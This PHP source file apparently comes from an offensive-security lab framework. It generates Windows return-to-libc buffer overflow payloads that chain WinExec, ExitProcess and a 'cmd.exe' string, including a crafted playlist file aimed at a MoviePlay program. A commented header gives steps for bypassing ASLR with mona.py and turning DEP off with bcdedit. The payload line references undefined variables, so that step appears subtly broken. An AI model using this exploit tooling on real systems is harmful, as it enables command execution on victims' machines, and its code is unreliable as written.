<?php
/*
 ##########################################################################

 // Windows return to dll -> Not YET
 $this->chapitre ( "Return to DLL" );


 $this->article("Avoiding/Bypassing ASLR","
 - check with Immunity 'mona.py' plugin which DLL was not compiled with ASLR support
 - !mona jmp -r esp -cm aslr=false,rebase=false -cp nonull");
 $this->article("Disable DEP","disable DEP -> bcdedit /set {current} nx AlwaysOff
 The DEP behavior on XP and 2003 server can be changed via a boot.ini parameter. Simply add the following parameter to the end of the line that refers to your OS boot configuration :
 /noexecute=policy
 (where 'policy' can be OptIn, OptOut, AlwaysOn or AlwaysOff)
 Under Vista/Windows 2008/Windows 7, you can change the settings using the bcdedit command :
 bcdedit.exe /set nx OptIn
 bcdedit.exe /set nx OptOut
 bcdedit.exe /set nx AlwaysOn
 bcdedit.exe /set nx AlwaysOff
 You can get the current status by running 'bcdedit' and looking at the nx value	");




 $host = $this->xp3;
 $rep_path = $this->create_folder("$this->dir_tmp/ret2lib4win.$host.ret2libc32w.exe.rep" );
 system("rm -v $rep_path/exploit_ret2lib4win_ret2libc32w_*");

 $vm_machine = new VM("$this->dir_vm/$host/$host.vmx");
 	
 $vm_machine->vm2upload("$this->dir_c/ret2libc32w.c","$this->vm_tmp_win\\ret2libc32w.c");
 $this->cmd($host,"gcc $this->vm_tmp_win\\ret2libc32w.c -o $this->vm_tmp_win\\ret2libc32w.exe -w -fno-pie -z norelro -ggdb -fno-stack-protector  -m32 -mtune=i386 ");
 //$vm_machine->vm2exec_prog("C:\Program Files\Dev-Cpp\MinGW64\\bin\\gcc.exe"," $this->vm_tmp_win\\ret2libc32w.c -o $this->vm_tmp_win\\ret2libc32w.exe -w -ggdb -fno-stack-protector  -m32 -mtune=i386",""); $this->pause();
 $vm_machine->vm2download("$this->vm_tmp_win\\ret2libc32w.exe", "$this->vm_tmp_lin/ret2libc32w.exe");

 $vm_machine->vm2upload("$this->dir_c/findit.c","$this->vm_tmp_win\\findit.c");
 $this->cmd($host,"gcc $this->vm_tmp_win\\findit.c -o $this->vm_tmp_win\\findit.exe -w -fno-pie -z norelro -ggdb -fno-stack-protector  -m32 -mtune=i386  ");
 $this->pause();
 	

 $file_bin = new ret2lib4win("$this->dir_tmp/ret2libc32w.exe");
 $offset_eip = 16;
 	
 $this->titre("Find compostants addr from Payload -> &WinExec &ExitProcess &cmd.exe ");
 $programme_pid = $vm_machine->vm4win2pid("$file_bin->file_name.exe");
 $winexec = $vm_machine->vm2addr4fonction_prog_pid($programme_pid, "WinExec");
 $exitProcess = $vm_machine->vm2addr4fonction_prog_pid($programme_pid, "ExitProcess");
 $this->titre("Addr cmd"); // cmd\0 ou cmd.exe\0
 $search_txt = "cmd.exe"; // cmd.exe , cmd, dir
 $ext_file = "lst";
 $argv_winexec = "0xbadbabe5";
 $this->ssTitre("Addr All SHELL WIN");
 $tab_cmd_addr = $vm_machine->vm2addr4str_prog_pid($programme_pid, "cmd.exe","crtdll.dll") ;

 if (empty($tab_cmd_addr)) {
 $this->important("No cmd Addr");
 return 0;
 }
 $header = '';
 $footer = 'AAAA';
 $this->titre("Output not clean");
 $this->ssTitre("Payload: NOTHING x OFFSET +  &WinExec + BBBB + &CMD + &ARGV WinExec");
 $file_bin->ret2lib4win_system_exit_cmd_string_payload($rep_path,$host, $header, $footer, $winexec, "0x42424242", $tab_cmd_addr, $offset_eip, $ext_file);
 $this->titre("Output clean");
 $this->article("Output clean", "means we don't have -> Segmentation fault (core dumped) -> add &exit");
 $this->ssTitre("Payload: NOTHING x OFFSET +  &WinExec + &ExitProcess + &CMD + &ARGV WinExec");
 $file_bin->ret2lib4win_system_exit_cmd_string_payload($rep_path,$host, $header, $footer, $winexec, $exitProcess, $tab_cmd_addr, $offset_eip, $ext_file);
 $this->pause();
 	
 	
 $file_bin = new ret2lib4win("$this->dir_tmp/MoviePlay.exe");
 $offset_eip = 1041;
 $this->titre("Find compostants addr from Payload -> &WinExec &ExitProcess &cmd.exe ");
 $programme_pid = $vm_machine->vm4win2pid($file_bin->file_name.".exe");
 $winexec = $vm_machine->vm2addr4fonction_prog_pid($programme_pid, "WinExec");
 $exitProcess = $vm_machine->vm2addr4fonction_prog_pid($programme_pid, "ExitProcess");
 $this->titre("Addr cmd"); // cmd\0 ou cmd.exe\0
 $dll_search = "all";
 $search_txt = "cmd.exe"; // cmd.exe , cmd, dir

 $ext_file = "lst";
 $argv_winexec = "0xbadbabe5";
 $this->ssTitre("Addr All SHELL WIN");


 $tab_cmd_addr = $vm_machine->vm2addr4str_prog_pid($programme_pid, "cmd.exe","crtdll.dll") ;

 if (empty($tab_cmd_addr)) {
 $this->important("No cmd Addr");
 return 0;
 }
 $header = '\x5b\x4d\x6f\x76\x69\x65\x50\x6c\x61\x79\x5d\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x30\x3d\x43\x3a\x5c';
 $footer = '\x2e\x6d\x70\x33\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a';
 $this->titre("Output not clean");
 $this->ssTitre("Payload: NOTHING x OFFSET +  &WinExec + BBBB + &CMD + &ARGV WinExec");
 $file_bin->ret2lib4win_system_exit_cmd_string_payload($rep_path,$host, $header, $footer, $winexec, "0x42424242", $tab_cmd_addr, $offset_eip, $ext_file);
 $this->titre("Output clean");
 $this->article("Output clean", "means we don't have -> Segmentation fault (core dumped) -> add &exit");
 $this->ssTitre("Payload: NOTHING x OFFSET +  &WinExec + &ExitProcess + &CMD + &ARGV WinExec");
 $file_bin->ret2lib4win_system_exit_cmd_string_payload($rep_path,$host, $header, $footer, $winexec, $exitProcess, $tab_cmd_addr, $offset_eip, $ext_file);
 $this->pause();
 */
##########################################################################

class ret2lib4win extends bin4win{


	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
	}
	


function ret2lib4win_methode1($rep_path,$host, $offset_eip) {
	$this->gtitre("Methode 1 ");
	$vm_machine = new VM("$this->dir_vm/Hack.vlan/$host/$host.vmx");
	$this->titre("Find compostants addr from Payload -> &WinExec &ExitProcess &cmd.exe ");
	$programme_pid = $vm_machine->vm4win2pid("$this->file_name.exe");
	$winexec = $vm_machine->vm2addr4fonction_prog_pid($programme_pid, "WinExec");
	//win_hex_symbol($rep_path, $host, $winexec, $programme_name, $programme_pid);
	$exitProcess = $vm_machine->vm2addr4fonction_prog_pid($programme_pid, "ExitProcess");
	//win_hex_symbol($rep_path, $host, $exitProcess, $programme_name, $programme_pid);
	$this->titre("Addr cmd"); // cmd\0 ou cmd.exe\0
	$dll_search = "all";
	$search_txt = "cmd.exe"; // cmd.exe , cmd, dir
	
	$ext_file = "lst";
	$argv_winexec = "0xbadbabe5";
	$this->ssTitre("Addr All SHELL WIN");
	//$tab_cmd_addr = win_search_txt($rep_path, $host, $programme_name, $programme_pid, $search_txt, $dll_search);
	
	$tab_cmd_addr = $vm_machine->vm2addr4str_prog_pid($programme_pid, "cmd.exe","crtdll.dll") ;
	//$tab_cmd_addr = "0x003E2DE7";
	if (empty($tab_cmd_addr)) {
		$this->important("No cmd Addr");
		return 0;
	}
	$header = '\x5b\x4d\x6f\x76\x69\x65\x50\x6c\x61\x79\x5d\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x30\x3d\x43\x3a\x5c';
	$footer = '\x2e\x6d\x70\x33\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a';
	$this->titre("Output not clean");
	$this->ssTitre("Payload: NOTHING x OFFSET +  &WinExec + BBBB + &CMD + &ARGV WinExec");
	$this->ret2lib4win_system_exit_cmd_string_payload($rep_path,$host, $header, $footer, $winexec, "0x42424242", $tab_cmd_addr, $offset_eip, $ext_file);
	$this->titre("Output clean");
	$this->article("Output clean", "means we don't have -> Segmentation fault (core dumped) -> add &exit");
	$this->ssTitre("Payload: NOTHING x OFFSET +  &WinExec + &ExitProcess + &CMD + &ARGV WinExec");
	$this->ret2lib4win_system_exit_cmd_string_payload($rep_path,$host, $header, $footer, $winexec, $exitProcess, $tab_cmd_addr, $offset_eip, $ext_file);
}


function ret2lib4win_system_exit_cmd_string_payload($rep_path, $host, $header,$footer,$winexec, $exitProcess, $cmd_addr,  $offset, $ext_file) {

	$vm_machine = new VM("$this->dir_vm/Hack.vlan/$host/$host.vmx");
	
	$size_header = $this->hex2size($header);
	$size_footer = $this->hex2size($footer);
	$offset_eip = $offset - ($size_header);
	
	//list($winexec, $exitProcess, $cmd_addr)= array_map("$this->hex2norme_32", array($winexec,$exitProcess,$cmd_addr));
	$winexec = $this->hex2norme_32($winexec);
	$exitProcess = $this->hex2norme_32($exitProcess);
	$cmd_addr = $this->hex2norme_32($cmd_addr);
	
	
	$this->article("Variables", "\n\t&system: $winexec\n\t&exit: $exitProcess\n\t&cmd: $cmd_addr");
	// addr_string_content_display_large($programme,$cmd);
	//list($winexec_p, $exitProcess_p, $cmd_p)= array_map("$this->hex2rev_32", array($winexec,$exitProcess,$cmd_addr));
	$winexec = $this->hex2rev_32($winexec);
	$exitProcess = $this->hex2rev_32($exitProcess);
	$cmd_addr = $this->hex2rev_32($cmd_addr);
	
	$payload = "python -c 'print \"$header\"+\"A\"*$offset_eip+\"$winexec_p\"+\"$exitProcess_p\"+\"$cmd_p\"+\"$footer\"'";
	$badchars = "\\x20\\x0a";
	//$this->payload2check4norme($payload, $badchars);
	$query = "$payload | tee $rep_path/exploit_ret2lib4win_$this->file_name"."_system_"."$winexec"."_"."$exitProcess"."_"."$cmd_addr".".$ext_file";
	$this->requette($query);
	
	$this->ssTitre("Compressing and Uploading Exploits");
	$exploit_archive = "exploit_ret2lib4win_$this->file_name"."_system.tar";
	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2lib4win_$this->file_name"."_system_*" . ".$ext_file ");
	
	$file = "$rep_path/$exploit_archive";
	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	$vm_machine->vm2upload($file, $dest);
	

}

}
?>